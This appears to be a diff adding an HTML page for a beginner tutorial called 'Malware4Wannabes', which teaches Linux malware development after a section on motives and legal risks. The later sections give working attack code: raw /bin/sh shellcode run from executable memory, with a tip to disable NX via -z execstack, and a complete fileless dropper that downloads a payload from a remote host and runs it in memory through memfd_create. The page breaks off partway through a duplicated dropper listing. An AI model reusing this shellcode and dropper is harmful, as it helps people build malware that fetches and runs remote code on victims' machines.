@@ -1,0 +1,1718 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malware4Wannabes</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<pre  class="txtdiv">
+Malware4Wannabes
+ *  * *  *  *** 
+* *  *    **    
+   *    *      *
+ *  *    *  *   
+             * *
+  *             
+*      *        
+      *   **  * 
+   *    *       
+                
+                
+     *
+
+I.   Introduction
+II.  Brief overview
+III. Why Do We Write Malware?
+IV.  Malware for Wannabes
+V.   Write Your First Malware
+</pre>
+
+<p>
+    1.Introduction 
+
+Initially, I intended to introduce a Polymorphic Engine tutorial, but it became clear that many readers are still in the early stages of learning. 
+Many people don't fully grasp what malware development entails. But if you’re here, it shows you want to learn, and that’s what matters. 
+Means you got the potential to do some wild shit and uncover a lot of dope things, and maybe even help this community grow a bit. I see potential! ;0
+
+You might be interested in malware analysis, or just curious about the terms that are so frequently used in hacking communities. In that case this piece is probably for you. The article provides source codes with explanations, The source code listings are usually no fully functional programs(stub). This is not a step-by-step guide on how to build a malware, The only purpose of the source codes is to help with understanding of the concepts by giving examples.
+
+We’ll start with a quick overview of malware, types, and motivations behind it. I’ll also touch on the ethical considerations and risks involved. No one really talks about the risks in this kind of work, so I’ll cover why it's important to know them before you start doing dumb shit. Might throw in some OpSec tips too, just for the old time sake. And yeah, we’ll get into some programming lessons. I’ll introduce CASM (C + ASM) and show you a simple example. You’ll get a feel for different file types, execution methods, shellcode execution and injection, plus some cryptography. We’ll even dabble in crypters, obfuscation, and maybe just maybe some anti-analysis techniques. There’s a lot to cover, but this is just the start.
+
+This is Part I. If it clicks and you find it useful, we’ll keep going. This post is meant to help you start your own projects. Remember, learning to code is just the beginning. The real key is understanding what’s happening behind the scenes when you write that code. I’ll do my best to explain things clearly. Even if you have experience, there might still be useful information for you here.
+
+Quick note: I’ll aim to keep things simple, but it helps to have some basic programming knowledge. If you're not familiar with it, just follow along and use Google for quick searches.
+
+One last thing: This post is inspired by the work of 0x00pf in Programming. A big thanks to 0x00pf for laying the groundwork. You can find the original in the references below, or you can just Google it. It feels great to discover it on your own!.(‌‌‌‌‍‬‬‌‌‌‌‌‍﻿‍‌‌‌‌‌‍﻿‍‌look‌‌‌‌‍﻿‌‌ ‌‌‌‌‍﻿‌﻿‌‌‌‌‌﻿‬‬closely‌‌‌‌‌‬﻿﻿‌‌‌‌‌‬﻿﻿‌‌‌‌‍‬‍﻿‌‌‌‌‍‬‬‍‌‌‌‌‍﻿‍‌‌‌‌‌‍‬‬‌ at‌‌‌‌‍﻿‍‍‌‌‌‌‍‬‌‬ ‌‌‌‌‌‬﻿‬‌‌‌‌‍‬‌﻿‌‌‌‌‍‬﻿﻿what‌‌‌‌‍‬﻿‍ ‌‌‌‌‌‬﻿﻿‌‌‌‌‌﻿‌‌‌‌‌‌‍﻿‬‌‌‌‌‌‌﻿‌‌‌‌‌‌‌﻿‌‌you‌‌‌‌‍﻿‌‌‌‌‌‌‍‬‍‬‌‌‌‌‌‬﻿﻿‌‌‌‌‍﻿‌‌‌‌‌‌‍﻿‌‬‌‌‌‌‍‬﻿﻿‌‌‌‌‍‬‍﻿‌‌‌‌‍﻿‌‬ ‌‌‌‌‍‬‌‍‌‌‌‌‍‬﻿‍_can‌‌‌‌‍‬﻿‍‌‌‌‌‍‬‬‍'‌‌‌‌‍‬﻿‬‌‌‌‌‍‬‍﻿‌‌‌‌‌﻿‍‌t‌‌‌‌‍﻿‍﻿‌‌‌‌‍‬‌‍‌‌‌‌‍‬﻿‬‌‌‌‌‍‬﻿‬‌‌‌‌‍‬‌‍‌‌‌‌‍‬‌‬_ see‌‌‌‌‍‬‍‍‌‌‌‌‍﻿‌﻿‌‌‌‌‌‬﻿﻿.)
+</p>
+
+<hr>
+
+<p>
+    2. Brief overview 
+    
+This is where it gets tricky for me. I need to give an overview of concepts across different operating systems: Linux, macOS, and Windows. Recently, there’s been more focus and offensive research on Windows, but I feel like we should also bring back attention to Linux. While Linux and macOS haven’t been covered as extensively, the core concepts of malware remain fundamentally the same across all platforms, so we should cover them as well.
+Does ELF malware have a future? With Linux running on every phone, IoT device, and desktop, what do you think?
+
+So, what are we talking about here, and what do we need to get into malware development? A lot of research and failure. I'm just saying. People get too caught up in which languages to use. it doesn’t really matter. It's not about following patterns; it's about coming up with something unique something no one else has done or tried before.
+
+As long as you understand the underlying idea or objective of what you're trying to do, that’s all you need. That’s why knowing your stuff is important. You have to focus on the basics and fundamentals. Sure, higher concepts like pentest' , adversary simulation attract a lot of people, but only a few stick around and actually do the work. It's simple, but not easy.
+
+To get into this kind of work, you’ve got to be ready to fail and feel kind of dumb sometimes. That sentimental stuff comes with it. Now, with that said, what you need will vary on a per-project basis, and that’s what we’re doing here.
+
+At first, I’m thinking of breaking this into parts. What I mean is, I’m not going to teach you how to write malware in a few posts; that’s for you to figure out. But I’ll push you, giving you ideas, techniques, and concepts you need to do it. We’ll cover Linux malware development, with macOS and Windows and at the end of this series.
+</p>
+
+<hr>
+
+<p>
+    3. Why Do We Write Malware? 
+    
+    Everybody knows that the Plague is coming.
+    Everybody knows that it's moving fast.
+    Everybody knows that the naked man and woman are just a shining artifact of the past.
+                                                                —Leonard Cohen, "Everybody Knows."
+
+Almost all malware these days is driven by one thing; money. But here’s the thing: that wasn’t always the case, and it still isn’t in certain instances we’ll touch on. I once read,<span style="font-weight: bold; color: #0077ff;">"Violence and other evils occur when human needs are thwarted."</span> simple as that. So is everyone who writes malware some kind of evil mastermind? Violent, morally bankrupt? And what about anyone who wants to learn how to code it are they villains? Nah.
+
+Back in the day, viruses, haven’t mentioned this yet had a primary and often an optional secondary goal. The primary mission? Survive, spread, repeat. (sound familiar?) The secondary? That was the fun part wiping out data or screwing up system performance.
+
+Writing a virus meant getting to learn assembler. Was there any money in it? Hell no. It was a flex for the "VXers", a game with the "AVers". It was about proving you could outsmart the system, getting your signature out there, and earning some underground cred. A pure hobbyist’s rush.
+
+Fast forward to today, and everything’s changed. There are way more players now, and let’s be honest, a lot more psychological imbalance too. The reasons for writing malware have shifted, and so has the malware itself.
+
+This brings us back to financial gain. Ransomware? Yes, it’s all about the cash. Just like banking trojans or stealers if it’s designed to steal, lock, blackmail, or extort, you know the motivation. It's pretty clear, right?
+
+But wait, does everyone developing malware or researching ransomware have dollar signs in their eyes? Absolutely not. It really comes down to this: What are your intentions? Keep them clear and maintain tight (OpSec).
+
+Ransomware might seem like a recent trend, but it’s been around for a while. One of the first? A Trojan written in 1989. But the rise of cryptocurrency? That made ransomware explode, money that’s hard to trace made it inevitable.
+
+If you break down the motivations behind malware, it’s clear there are different forces at work, each tied to a different mindset.
+
+So, which one are you? Or Wannabe?
+
+If you’re in the State, there's Computer Fraud and Abuse Act (CFAA) can turn your mistakes into felony charges. Other countries? Yeah, they’ve got cybercrime laws too. If your malware crosses borders, congrats, you might be facing extradition. Even if it was an accident, negligence won’t save you from the fallout. Intent won’t matter if your code causes damage !! it’s still your mess.
+
+Sometimes ethics and law don’t match. So always ask yourself: <b>“Is this worth it?”</b> Just because you can do something doesn’t mean you should.
+
+</p>
+
+<hr>
+
+<p>
+    4. Malware for Wannabes 
+    
+I’ll cover some theory, and you’re free to choose your preferred programming language for malware development. I’ll just explain the core concepts. Different languages, like Rust, may have varying implementations, but the core principles stay the same. Most of the code here will be in C and ASM. Your task, if you're using Rust or any other language, is to implement what we discuss in that language.
+That said, you don’t always need to interact with low level code to achieve things like code injection these days. You can inject from memory, find imports, and more without much hassle. Still, low level will help you explore more advanced areas, like reverse engineering, kernel-level rootkits, and understanding how execution and infection work at a system level.
+
+<span style="font-weight: bold; color: #ff9900;">Take it easy, learn it properly. Don’t take shortcuts.</span>
+
+I'll cover basic socket programming with some examples and introduce you to malware. I’ll also showcase and talk about C2, or command and control servers, and we’ll write one as an example. We’ll showcase some malware techniques, write a dropper, and cover malware defense evasion, process injection, and Anti-analysis techniques. Of course, we’ll also touch on cryptography and simple obfuscation, and we’ll talk a little about anti-analysis techniques.
+
+Let's write some code nothing beats a simple Hello World program to get comfortable. Actually, you know what? Let’s write something even simpler before jumping into something as sophisticated as Hello World.
+
+<span class="preformatted">
+    global _start
+    _start:
+    ; Syscall: exit (sys_exit)
+    ; Syscall number for exit is 60 on x86-64
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+</span>
+
+We’re making a system call to exit the program:
+
+The first thing we do is mark the entry point of the program with global _start. This tells the linker where execution begins Without it, the linker wouldn’t know where to start(More on this later)
+
+We load the number 60 into the rax register using mov rax, 60. On x86-64 systems, each system call has a unique number, and 60 corresponds to the exit system call. Then, we zero out the rdi register with xor rdi, rdi. The rdi register holds the exit code, so setting it to 0 means we’ll exit the program with a success status.
+
+Finally, the syscall instruction tells the kernel to execute the system call we’ve set up, in this case, to exit. And that’s it! The program runs and exits immediately, returning 0 as the status code, meaning everything worked fine.
+
+<span class="preformatted">
+    $ nasm -f elf64 -o first.o first.asm
+    $ ld -o first first.o
+    $ ./first
+    $ 
+</span>
+
+After running it, we can see that the program exits 0, which is fine (means no output was generated but terminated successfully). The –f elf64 specifies that the output format is an ELF 64bit, and the -o first. elf option adds a section called. Related and useful:-c -o first. o makes NASM to generate object file by name first. First. o in the object file first. asm.
+
+So, what’s going on here? Where the assembler processes first. asm file; it will generate machine code for its program and save those codes into first. o object file. Yet you don't even have a program that runs at that point; all you have are the literal machine code. When you call the linker through ld, it is supposed to get the object file(first. o`) and produce an executable that is run by the operating system.
+
+We used NASM to convert our assembly source code into object code with nasm -f elf64 -o first.o first.asm. The format flag -f elf64 is to ensures we produce 64-bit object code that works with Linux. Then, we used the linker to create a final executable with ld -o first first.o Finally, we executed the program with ./first, and since it’s a simple exit call, no output is generated but the program terminates successfully.
+
+We're really doing is using the SYS_EXIT system call, which killed it with kindness and gives a return code to the calling process. The syscall number for the x86-64 exit is 60 (0x3c in hex). Here are the steps in x86-64 to invoke a system call (Yes steps, not sequence),
+
+    1. Put the system call number into rax.
+    2. Develop all registers you need to use for parameters.
+    3. Issue the syscall instruction and pass control to the kernel.
+
+And there you have it! You have written a minimal orchestration program in assembly that shows the process of turning source code into an executable binary running on your qemu virtual machine.
+
+This in turn passes control to the OS kernel which then executes the requested operation. syscall; this puts the system into kernel mode.
+
+<span class="preformatted">
+    mov rax, 60     ; Load syscall number for exit (0x3c)
+    xor rdi, rdi    ; Status = 0
+    syscall         ; _exit
+</span>
+
+One key aspect that might not be immediately clear is how we pass the result (the exit status) to the exit call. For the exit syscall, the rdi register must contain the value we want our program to return. In this case, we set rdi to 0 (success) before making the syscall.
+
+To understand the concept let's switch gears and look at how we can reproduce our assembly program in C. In C, every program must have an entry point, which is typically the main() function. However, when working with lower-level operations like system calls, we can specify different entry points by utilizing function attributes or linker scripts, but for now, we’ll keep it simple.
+
+<span class="preformatted">
+    #include <unistd.h>
+
+        int main() {
+            _exit(0); // Call _exit to terminate the program with status 0
+        }
+</span>
+
+"unistd.h" is one of the files that lets you access the POSIX operating system API which includes the function _exit, The function main() is the accepted standard form for the point of entry in a C program. All execution pattern begins at this point whenever a program runs, and Instead of utilizing a syscall bare, we do the _exit(0) function which is a C library function that terminates program and returns success status 0. This is what our assembly program does when the ‘exit’ syscall is executed.
+
+For every C program, its execution begins with the main function which is regarded as entry point of program execution, is a rule that is understood by C compiler and linker. If you compile this C code, when the program is run, the linker will make sure the executable will call the main() function.
+    
+On the other hand, in the case of our assembly code, the entry point is determined by the _start label. The linker must know to look for this label to start execution, that is the reason why we are declaring it as global _start. This informs the linker that tag _start is the starting point of the program in its execution.
+    
+The _exit() function has a specific function in our C program. In contrast to exit() which cleans up, like flushing I/O buffers and calling the atexit functions,_exit()
+    
+simply completes the process. This is useful, in this instance, when we wish to exit the program cleanly without pe Persistent systems. Compile Simply:
+
+simply completes the process. This is useful, in this instance, when we wish to exit the program cleanly without pe Persistent systems. Compile Simply:
+
+<span class="preformatted">
+    $ gcc -o first first.c
+    $ ./first 
+    $ 
+</span>
+
+The compiler generates an object file, which is then passed to the linker. The linker’s job is to combine the compiled object file with any necessary libraries and resolve references to ensure that all function calls are correctly linked. For example, it links the _exit function from the C standard library, allowing our program to call it seamlessly.
+
+The linker sets up the executable so that when it is run, the OS starts execution from the main() function. This automatic linking process contrasts with assembly, where we manually specify entry points and handle system calls directly.
+
+In contrast, assembly code is specific to the architecture it was written for; a program written in x86 assembly won't run on ARM architecture without significant modifications. This specificity can be advantageous for targeted attacks, where the malware needs to exploit particular hardware vulnerabilities or behaviors. Assembly language allows for more direct manipulation of system resources.
+
+That's why I don’t see the point of covering bare metal programming in this context. Each hardware device has its own peculiarities, complicating the development of generic malware.
+
+So far, so good? Great! Now, let’s set the stage for writing our first shellcode. You might remember the classic "Hello World" program. On Linux, the way to accomplish this is by writing to the standard output (the console). The standard output is recognized by the system as the file descriptor 1 for any process. but for now, it’s important to know that if you pass 1 as the first parameter to the write system call, you will be outputting text to the console.
+
+Knowing that the write system call is identified as 1 in Linux for the x86_64 architecture, let’s put this knowledge into practice. Here’s how our simple shellcode will look:
+
+<span class="preformatted">
+    global _start                  ; Declare the entry point for the linker
+
+_start:
+    ; Write our message to standard output
+    mov rax, 1                    ; sys_write
+    mov rdi, 1                    ; File descriptor 1 (stdout)
+    mov rsi, msg                  ; Pointer to the message
+    mov rdx, 14                   ; Length of the message 
+    syscall                       
+
+    ; Exit the program
+    mov rax, 60                   ; sys_exit
+    xor rdi, rdi                  ; Status code 0 
+    syscall                       ; _exit
+
+msg db 'Hello, World!', 0x0A      ; 0x0A` = `10`. This is equal to the ASCII code for LF (Line Feed),
+                                    which is a newline on Linux
+</span>
+
+And that’s it! Just compile the program, and you’ve already learned all the bits and pieces to write very basic shellcode. A shellcode, in its simplest form, is a piece of code that starts a shell. In malware, once executed, shellcode can run commands, download and execute additional payloads, or exfiltrate data. Using the execve syscall to execute other programs or commands, and leveraging the socket syscall to establish network connections for remote control.
+
+Now let's take this and write something that can actually be used as shellcode to execute a process using the execvesystem call. This system call requires three parameters, but for our first shellcode, we can set the last two to 0. The only parameter we need is the first one a pointer to the name of the program to run, which in this case would be /bin/sh.
+
+<span class="preformatted">  
+      global _start
+    _start:
+        ; Set up execve syscall
+        xor rax, rax           ; Clear rax
+    
+        mov rdi, sh            ; pointer to '/bin/sh'
+        push rax               ; n
+        push rdi               ; Push pointer to '/bin/sh' onto the stack
+        mov rsi, rsp           ; pointer to the args array
+        mov rdx, rax           ; NULL (environment variables)
+    
+        ; Call execve
+        mov rax, 59            ; Syscall_execve
+        syscall        
+</span>
+
+Now let's try to assemble and link this piece of code to see if it works.
+
+<span class="preformatted">
+    $ nasm -f elf64 shell.asm
+    $ ld shell.o
+    $ ./a.out
+    $    
+</span>
+
+Excellent, we’ve just assembled and linked our shellcode, and upon execution, it should start a new shell. If everything is set up correctly, you should see a new shell prompt indicating that our shellcode has executed successfully. You can type any command, and it will run in the context of that shell, And there you have it! You’ve successfully written, compiled, and executed shellcode that launches a shell using the execve syscall.
+
+Now that we’ve got our shellcode written in assembly, assembled, and linked successfully, it’s time to try embedding that shellcode directly into a C program to see if we can execute it seamlessly. The key idea here is to write the shellcode as raw bytes in C and jump to it as if it were a function.
+
+<span class="preformatted">
+    int main(void) {
+        char shellcode[] =
+        "\x48\x31\xd2"                                  // xor    %rdx, %rdx
+        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
+        "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
+        "\x53"                                          // push   %rbx
+        "\x48\x89\xe7"                                  // mov    %rsp, %rdi
+        "\x50"                                          // push   %rax
+        "\x57"                                          // push   %rdi
+        "\x48\x89\xe6"                                  // mov    %rsp, %rsi
+        "\xb0\x3b"                                      // mov    $0x3b, %al
+        "\x0f\x05";                                     // syscall
+    
+        void *exec_mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+        memcpy(exec_mem, shellcode, sizeof(shellcode));
+    
+        // Execute shellcode
+        (*(void (*)())exec_mem)();
+    return 0;
+    }
+</span>
+
+Notice that we’re using raw machine code here. Each sequence of \x.. represents a byte of the shellcode, and we’ve translated our assembly instructions into their corresponding opcodes, By default, most modern operating systems have non-executable stack protections in place (thanks to DEP/NX), meaning any code you try to execute from data sections like the stack or heap will be blocked. To bypass this, compile with the -z execstack option. We’ll treat the shellcode like a function and cast it to a function pointer to execute it. The trick is simple: define the shellcode, cast it, and then call it.
+
+We cast our shellcode to a function pointer of type void (*)()—this essentially says, "Hey, treat this block of memory as a function that takes no arguments and returns nothing." By calling (*(void(*)()) shellcode)();, we jump to the start of our shellcode and execute it like a regular function.
+If everything worked correctly, you should be dropped into a new shell prompt, meaning our shellcode successfully executed the execve system call, and we’re now running /bin/sh. You can confirm by typing commands, and they should execute in the context of that new shell.
+
+So, go ahead, experiment with different syscalls, try crafting other shellcodes, Linux provides you with the set of functions that can be easily executed from assembly. These are known as system calls, and they are triggered by using interrupts. A listing of enumerated system calls can be found in /usr/include/asm-generic/
+
+<span class="preformatted">
+    $ head -n 60 /usr/include/asm/unistd.h
+/*
+ * This file contains the system call numbers, based on the
+ * layout of the x86-64 architecture, which embeds the
+ * pointer to the syscall in the table.
+ *
+ * As a basic principle, no duplication of functionality
+ * should be added, e.g. we don't use lseek when llseek
+ * is present. New architectures should use this file
+ * and implement the less feature-full calls in user space.
+ */
+
+#ifndef __SYSCALL
+#define __SYSCALL(x, y)
+#endif
+
+#if __BITS_PER_LONG == 32 || defined(__SYSCALL_COMPAT)
+#define __SC_3264(_nr, _32, _64) __SYSCALL(_nr, _32)
+#else
+#define __SC_3264(_nr, _32, _64) __SYSCALL(_nr, _64)
+#endif
+...
+</span>
+
+I talked about you preparing Google in the next tab, remember? This is that moment my friend,
+
+Let’s talk Networking. Up until now, we have looked into simple programs, syscalls and writing shellcode. Now everything is going to come together. As I mentioned earlier, malware is not a single thing. So, what are we doing now? I assume you know the very fundamentals of network things such as IP addresses, and have heard TCP/UDP before okay?
+
+That said, Linux is our focus today and its specifics are being shared in detail below. Every operating system provides different socket programming ways, it may not be exactly the same as Linux but concept of connection would basically remain the same. So, what’s a socket?
+
+This is also the interesting part, Now, imagine a socket as a phone line. Just like in every conversation, a phone establishes a connection between two persons, a socket joins two computers for the purpose of transmitting information. For example, a phone call needs the right number to be dialed and the listener must lift the receiver. Likewise, a socket creates a connection between two ends, which in this case is your computer and another device for communication purposes.
+
+This is convenient, because, when you configurate a socket, it means that you have to arrange the communication phone line:
+</p>
+
+<ul>
+    <li>TCP or UDP: This is like deciding if the call should be crystal clear with no interruptions (TCP) or a quicker, less reliable chat where parts might get missed (UDP).</li>
+    <li>Protocol: Similar to picking the language you'll speak during the call, this is the communication standard you follow for data exchange.</li>
+    <li>Incoming IPs: Think of this as deciding who’s allowed to call you—whether it’s just close friends (specific IPs) or anyone with your number (open to all).</li>
+    <li>Port Number: This is like the extension number you dial when reaching a department in a large company. Each port number tells the system exactly which service to connect with.</li>
+</ul>
+
+<p>
+With all this in place, the socket is ready to make calls, allowing data to flow between devices—similar to how voices travel over a phone line. While it's not exactly like a phone line, the analogy helps convey the idea. Let's take an example:
+
+<span class="preformatted">
+    #include &lt;sys/socket.h&gt;
+    #include &lt;netinet/in.h&gt;
+    #include &lt;arpa/inet.h&gt;
+    #include &lt;stdio.h&gt;
+    #include &lt;stdlib.h&gt;
+    #include &lt;string.h&gt;
+    #include &lt;unistd.h&gt;
+    #include &lt;time.h&gt;
+
+int main(void)
+{
+    int listenfd = 0, connfd = 0;
+    struct sockaddr_in serv_addr;
+    char sendBuff[1025];
+    time_t ticks;
+
+    listenfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (listenfd < 0) {
+        perror("Socket creation failed");
+        return -1;
+    }
+    printf("Socket created successfully\n");
+
+    memset(&serv_addr, 0, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;    
+    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY); 
+    serv_addr.sin_port = htons(5000);  
+
+    if (bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
+        perror("Socket binding failed");
+        return -1;
+    }
+
+    if (listen(listenfd, 10) < 0) {
+        perror("Listen failed");
+        return -1;
+    }
+
+    printf("Waiting for connections...\n");
+
+    while (1) {
+        connfd = accept(listenfd, (struct sockaddr*)NULL, NULL);
+        if (connfd < 0) {
+            perror("Accept failed");
+            continue;
+        }
+
+        ticks = time(NULL);
+        snprintf(sendBuff, sizeof(sendBuff), "Current time: %.24s\r\n", ctime(&ticks));
+
+        if (write(connfd, sendBuff, strlen(sendBuff)) < 0) {
+            perror("Write failed");
+        } else {
+            printf("Sent: %s", sendBuff);
+        }
+
+        close(connfd);
+        sleep(1);  
+    }
+
+    return 0;
+}
+</span>
+
+This code defines a simple server that listens on port 5000. When a client connects, it retrieves the current time using time() and ctime(), then sends it to the client. The server runs in an infinite loop, ready to accept multiple connections. Each time a client connects, the server sends the current time in a readable format.
+
+Next, we need a client application that runs on another device to read the message sent by the server (which is the current time). Let’s call it Client.c.
+
+<span class="preformatted">
+    #include &lt;sys/socket.h&gt;
+    #include &lt;netinet/in.h&gt;
+    #include &lt;arpa/inet.h&gt;
+    #include &lt;stdio.h&gt;
+    #include &lt;string.h&gt;
+    #include &lt;stdlib.h&gt;
+    #include &lt;unistd.h&gt;
+
+int main(void)
+{
+    int sockfd = 0;
+    char recvBuff[1024];
+    struct sockaddr_in serv_addr;
+
+    memset(recvBuff, 0, sizeof(recvBuff));
+
+    // Create socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    if (sockfd < 0) {
+        perror("Socket creation failed");
+        return -1;
+    }
+
+    // Initialize server address struct
+    memset(&serv_addr, 0, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET; 
+    serv_addr.sin_port = htons(5000);  
+    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
+
+    // Connect to server
+    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
+        perror("Connection to server failed");
+        return -1;
+    }
+
+    // Read the message from the server
+    int n;
+    if ((n = read(sockfd, recvBuff, sizeof(recvBuff) - 1)) > 0) {
+        recvBuff[n] = '\0'; // Null-terminate the string
+        printf("Received: %s\n", recvBuff);
+    } else {
+        perror("Read failed");
+    }
+
+    // Close the socket
+    close(sockfd);
+    return 0;
+}
+</span>
+
+First, compile both programs, If you see the message below, congratulations! You’ve successfully completed your first step into network programming. You can also experiment by modifying the code to send different messages.
+
+    Current time: Fri Apr 18 07:23:14 2015
+
+Revisiting Initial socket() On the initial line, we call socket() to allocate the first and obtain that this tutorial has a socketMost posnet descriptor:
+
+    int socket(int domain, int type, int protocol);
+    
+The Domain: We will be using AF_INET meaning that we are using an IPv4 address (which can connect to machines that are different from one).
+    
+    Type: SOCK_STREAM specifies that we are creating a TCP connection.
+    
+• Protocol: We set this as 0 in order to denote that no specific protocol is needed.
+    
+    listenfd = socket(AF_INET, SOCK_STREAM, 0);
+    
+Now we have to define the server address. We use sockaddr_in structure because our domain is AF_INET
+    
+The code snippet below just shows the members of struct sockaddr_in that were defined in socket.h struct sockaddr_in { short int sin_family; unsigned short int sin_port; struct in_addr sin_addr; };
+    
+    Configuration of server address:
+    
+    serv_addr. sin_family = AF_INET;// Address family, IPv4 a spaceocation: 0 line:- This specifies the address family, in this case,IPv4.
+    
+    `serv_addr. sin_addr. s_addr = htonl(INADDR_ANY); // let the server accept incoming connections from any IP address which srouce is sent to the program via 7th argument
+    
+    serv_addr. sin_port = htons(5000);` — This shows that server will listen on port no.
+    
+Next, we use the bind function to link the socket with the server address
+    
+    bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
+    
+    listenfd: The socket descriptor returned by socket()
+    
+    `serv_addr: server address information configured with sockaddr_in
+    
+    sizeof(serv_addr); // size of address structure
+    
+After the binding the socket, we use listen to start accepting incoming connections.
+    
+    listen(listenfd, 10);
+    
+The server then busy-wait (entering an infinite look waiting for new client connections). When a client connects to our service, the acceptfunction will be called as(__accept)
+    
+    connfd = accept(listenfd, (struct sockaddr*) NULL,NULL);
+    
+The server accepts the connection, it gets the current time using time() and ctime(), and then forwards this to the client with its function write.
+    
+    The socket function allows us to create a socket — which is simply the endpoint that our program will use to send/receive over the network. A socket is like a telephone line that allows your program to call another program running on a different machine.
+    
+Socket Types: You can think of different types as different file type: For example, text file or binary file, so does for the protocol. This code sets up a stream socket (SOCK_STREAM) that uses TCP. TCP is connection-oriented and reliable, it's kind of like talking on a telephone, you pick up the handset before you talk.
+    
+Then we will connect to the specific location over the network(this is achieved using a system call connect). Now things get interesting:
+    
+We need to tell the connect function where to send our messages. This involves specifying both an IP address and a port.
+    
+The IP address `127.0.0.1` is a special address known as **localhost**, which refers to the current machine. The port number `2` is used here, but in real applications, you'd typically use a more common port.
+The code uses a structure, sockaddr_in, to hold the address details. A structure is like a container that packs together multiple related pieces of data.
+    
+Here’s what happens inside this structure:
+    
+    sin_family specifies the type of address family (in this case, it's set to AF_INET, which is for IPv4).
+    sin_port is where we specify the port we want to connect to (converted to network byte order with htons).
+    sin_addr.s_addr holds the IP address we're connecting to (also converted with htonl).
+    This structure is essential because it organizes the data that the connect function needs, Once connected, the code enters an infinite loop (while (1)) that continuously reads data from the socket:
+    
+The read function pulls data from the socket and places it into a buffer.
+The program then writes the received data to standard output (like your console), using write(STDOUT_FILENO, buffer, bytes_read).
+The loop will break if read returns 0 or a negative number, meaning there’s no more data to read or an error occurred. When that happens, the program closes the socket using close(socket_fd) and exits cleanly.
+    
+Now, Let's do something deffrent to really get started with network programming. We will start with something very simple but that will allow us to use everything we had already learnt at the same time that we dive into networking. For this purpose we will be writing a dropper.
+    
+A dropper is a program, usually very small, so it gets more chances to get transferred to a remote machine and whose goal is to download other files, or execute payload, Now, let’s take a look at a minimal dropper example to introduce some concepts.
+
+<span class="preformatted">
+    #include &lt;stdio.h&gt;
+    #include &lt;stdlib.h&gt;
+    #include &lt;string.h&gt;
+    #include &lt;unistd.h&gt;
+    #include &lt;arpa/inet.h&gt;
+    #include &lt;sys/mman.h&gt;
+    #include &lt;fcntl.h&gt;
+    #include &lt;errno.h&gt;
+        
+        struct Mem {
+            char *buf;
+            size_t sz;
+        };
+        
+        size_t append(struct Mem *mem, const char *data, size_t len) {
+            char *tmp = realloc(mem->buf, mem->sz + len + 1);
+            if (!tmp) return 0;
+            mem->buf = tmp;
+            memcpy(&mem->buf[mem->sz], data, len);
+            mem->sz += len;
+            mem->buf[mem->sz] = 0;
+            return len;
+        }
+        
+        void fetch_and_exec(const char *host, int port, const char *uri) {
+            int s = socket(AF_INET, SOCK_STREAM, 0);
+            if (s < 0) return;
+        
+            struct sockaddr_in srv = {0};
+            srv.sin_family = AF_INET;
+            srv.sin_port = htons(port);
+            inet_pton(AF_INET, host, &srv.sin_addr);
+            if (connect(s, (struct sockaddr *)&srv, sizeof(srv)) < 0) {
+                close(s);
+                return;
+            }
+        
+            char req[1024];
+            snprintf(req, sizeof(req), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", uri, host);
+            send(s, req, strlen(req), 0);
+        
+            char resp[4096];
+            struct Mem mem = {0};
+            ssize_t n;
+            while ((n = recv(s, resp, sizeof(resp) - 1, 0)) > 0)
+                append(&mem, resp, n);
+            
+            close(s);
+        
+            if (mem.sz > 0) {
+                int memfd = memfd_create("payload", MFD_CLOEXEC); // kernel 3.17 
+                if (memfd != -1) {
+                    write(memfd, mem.buf, mem.sz);
+                    char path[64];
+                    snprintf(path, sizeof(path), "/proc/self/fd/%d", memfd);
+                    if (fork() == 0) execl(path, "payload", NULL);
+                }
+                free(mem.buf);
+            }
+        }
+        
+        int main(int argc, char *argv[]) {
+            if (argc < 4) return 1;
+            fetch_and_exec(argv[1], atoi(argv[2]), argv[3]);
+            return 0;
+        }
+</span>
+
+This acts as our dynamic memory manager, where memory holds the buffer for the file being downloaded, and size keeps track of how much data we've received. It's a neat encapsulation that makes it easy to manage our memory usage while we fetch and prepare the executable code.
+
+The process kicks off by creating a TCP socket. This is done using the socket() system call, specifying AF_INET for IPv4 addresses and SOCK_STREAM for a reliable connection-oriented service. The subsequent connection to the server is established using the connect() syscall, where we provide the server's address and port, allowing us to communicate effectively.
+
+and we formulate the HTTP GET request. Using snprintf(), we construct a properly formatted request string that tells the server what resource we're interested in. This includes the path to the file and the host details. Once crafted, the request is sent over the established socket using send(), which pushes our request into the server's queue for processing.
+
+Now comes the fun part receiving the server's response. We employ the recv() syscall in a loop to read the incoming data. Each chunk is passed to our WriteMemory() function, which handles the dynamic resizing of our memory buffer. This function uses realloc() to ensure we have enough space for the new data and gracefully handles memory management. As data flows in, it’s stored in the dynamically allocated memory, building up our executable content in real time.
+
+With the complete file stored in memory, we turn our attention to executing this code. By leveraging memfd_create(), we create an anonymous memory file descriptor that allows us to write our executable content into a memory region. After writing the content to this memory, we fork the current process using fork(). The child process then replaces its memory space with the contents of our file using execl(), effectively executing the downloaded code in memory without ever writing it to disk.
+
+<span class="preformatted">
+    #include &lt;stdio.h&gt;
+    #include &lt;stdlib.h&gt;
+    #include &lt;string.h&gt;
+    #include &lt;unistd.h&gt;
+    #include &lt;arpa/inet.h&gt;
+    #include &lt;sys/mman.h&gt;
+    #include &lt;fcntl.h&gt;
+    #include &lt;errno.h&gt;
+        
+        struct Mem {
+            char *buf;
+            size_t sz;
+        };
+        
+        size_t append(struct Mem *mem, const char *data, size_t len) {
